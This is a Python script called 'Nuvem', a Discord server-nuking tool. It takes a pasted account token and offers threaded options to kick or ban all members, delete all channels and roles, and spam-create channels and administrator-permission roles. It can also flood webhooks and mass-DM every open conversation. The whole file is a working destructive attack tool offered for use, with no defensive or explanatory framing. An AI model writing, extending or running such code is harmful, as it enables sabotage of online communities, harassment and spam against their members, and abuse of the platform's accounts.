import requests, threading, os, time, random
from colorama import Fore, init

init(autoreset=True)
DELAY = 0.004
DEVIL_COLORS = [Fore.RED, Fore.MAGENTA, Fore.CYAN, Fore.YELLOW, Fore.LIGHTRED_EX]

def rgb_print(text):
    for char in text:
        print(random.choice(DEVIL_COLORS) + char, end="", flush=True)
        time.sleep(DELAY)
    print()

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def flying_rocket_animation():
    clear_screen()
    rocket = [
        "       /\\",
        "      /  \\",
        "     | NUVEM |",
        "     |______|",
        "     | || ||",
        "     | || ||",
        "    /_||__||_\\"
    ]
    for i in range(8):
        clear_screen()
        print("\n" * (8 - i))
        for line in rocket:
            print(" " * i + random.choice(DEVIL_COLORS) + line)
        time.sleep(0.08)
    rgb_print("🚀 Executing...")

class Nuvem:
    def __init__(self, token):
        self.token = token
        self.headers = {"Authorization": token, "Content-Type": "application/json"}
        self.base_url = "https://discord.com/api/v10"

    def get_guilds(self):
        res = requests.get(f"{self.base_url}/users/@me/guilds", headers=self.headers)
        return res.json() if res.status_code == 200 else []

    def get_members(self, guild_id):
        res = requests.get(f"{self.base_url}/guilds/{guild_id}/members?limit=1000", headers=self.headers)
        return res.json() if res.status_code == 200 else []

    def get_channels(self, guild_id):
        res = requests.get(f"{self.base_url}/guilds/{guild_id}/channels", headers=self.headers)
        return res.json() if res.status_code == 200 else []

    def get_roles(self, guild_id):
        res = requests.get(f"{self.base_url}/guilds/{guild_id}/roles", headers=self.headers)
        return res.json() if res.status_code == 200 else []

    def delete_channel(self, guild_id, channel_id):
        requests.delete(f"{self.base_url}/channels/{channel_id}", headers=self.headers)

    def create_channel(self, guild_id, name):
        data = {"name": name, "type": 0}
        requests.post(f"{self.base_url}/guilds/{guild_id}/channels", headers=self.headers, json=data)

    def delete_role(self, guild_id, role_id):
        requests.delete(f"{self.base_url}/guilds/{guild_id}/roles/{role_id}", headers=self.headers)

    def create_role(self, guild_id, name):
        data = {"name": name, "permissions": "8"}
        requests.post(f"{self.base_url}/guilds/{guild_id}/roles", headers=self.headers, json=data)

    def ban_member(self, guild_id, user_id):
        requests.put(f"{self.base_url}/guilds/{guild_id}/bans/{user_id}", headers=self.headers)

    def kick_member(self, guild_id, user_id):
        requests.delete(f"{self.base_url}/guilds/{guild_id}/members/{user_id}", headers=self.headers)

    def get_dms(self):
        return requests.get(f"{self.base_url}/users/@me/channels", headers=self.headers).json()

    def mass_dm(self, message):
        dms = self.get_dms()
        for dm in dms:
            try:
                requests.post(f"{self.base_url}/channels/{dm['id']}/messages", headers=self.headers, json={"content": message})
            except: pass

    def send_webhook(self, url, message):
        for _ in range(20):
            try:
                requests.post(url, json={"content": message})
            except: pass

def run_threads(target, data):
    threads = []
    for item in data:
        t = threading.Thread(target=target, args=(item,))
        t.start()
        threads.append(t)
        time.sleep(DELAY)
    for t in threads: t.join()

def main():
    clear_screen()
    rgb_print("💀 WELCOME TO NUVEM 💀")

    token = input(Fore.CYAN + "Paste your token: ").strip()
    bot = Nuvem(token)
    rgb_print("🔍 Finding servers...")
    guilds = bot.get_guilds()

    if not guilds:
        rgb_print("❌ No servers found.")
        return

    clear_screen()
    rgb_print("📂 Select server:")
    for i, g in enumerate(guilds):
        print(Fore.LIGHTMAGENTA_EX + f"[{i}] {g['name']} (ID: {g['id']})")
    try:
        selected = int(input(Fore.CYAN + "Choose number: "))
        guild_id = guilds[selected]['id']
    except:
        rgb_print("❌ Invalid selection.")
        return

    while True:
        clear_screen()
        rgb_print("💀 NUVEM DEVIL MENU 💀")
        print("""
[1] Kick All Members
[2] Ban All Members
[3] Delete All Channels
[4] Spam Create Channels
[5] Delete All Roles
[6] Spam Create Roles
[7] Webhook Spammer
[8] Mass DM Sender
[9] Exit
        """)
        choice = input(Fore.CYAN + "Select option: ")
        flying_rocket_animation()

        if choice == "1":
            members = bot.get_members(guild_id)
            run_threads(lambda m: bot.kick_member(guild_id, m['user']['id']), members)
            rgb_print("✅ Kicked all.")

        elif choice == "2":
            members = bot.get_members(guild_id)
            run_threads(lambda m: bot.ban_member(guild_id, m['user']['id']), members)
            rgb_print("✅ Banned all.")

        elif choice == "3":
            channels = bot.get_channels(guild_id)
            run_threads(lambda c: bot.delete_channel(guild_id, c['id']), channels)
            rgb_print("✅ Deleted channels.")

        elif choice == "4":
            run_threads(lambda i: bot.create_channel(guild_id, f"nuked-by-nuvem-{i}"), range(50))
            rgb_print("✅ Channels created.")

        elif choice == "5":
            roles = bot.get_roles(guild_id)
            run_threads(lambda r: bot.delete_role(guild_id, r['id']), roles)
            rgb_print("✅ Deleted roles.")

        elif choice == "6":
            run_threads(lambda i: bot.create_role(guild_id, f"devil-{i}"), range(30))
            rgb_print("✅ Roles created.")

        elif choice == "7":
            url = input("Paste webhook URL: ")
            msg = input("Webhook spam message: ")
            run_threads(lambda _: bot.send_webhook(url, msg), range(20))
            rgb_print("✅ Webhook spam complete.")

        elif choice == "8":
            msg = input("Enter DM message: ")
            bot.mass_dm(msg)
            rgb_print("✅ DM sent to open DMs.")

        elif choice == "9":
            rgb_print("👋 Goodbye.")
            break

        else:
            rgb_print("❌ Invalid option.")

        input(Fore.GREEN + "\nPress Enter to return to menu...")

if __name__ == "__main__":
    main()